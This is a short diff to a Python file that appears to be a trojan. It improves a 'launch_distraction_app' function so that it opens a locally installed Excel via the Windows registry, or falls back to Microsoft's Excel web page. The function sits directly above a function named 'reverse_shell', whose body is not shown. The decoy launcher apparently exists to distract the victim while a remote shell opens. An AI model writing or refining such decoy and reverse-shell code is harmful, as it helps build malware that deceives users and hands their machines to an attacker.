@@ -307,8 +307,15 @@ import webbrowser
 
 def launch_distraction_app():
     try:
+        excel_key = r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\excel.exe"
+        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, excel_key):
+            subprocess.Popen(["start", "excel"], shell=True)
+            return
+    except FileNotFoundError:
+        pass
+    try:
         webbrowser.open("https://www.microsoft.com/en-us/microsoft-365/excel")
-    except Exception:
+    except:
         pass
 
 def reverse_shell():
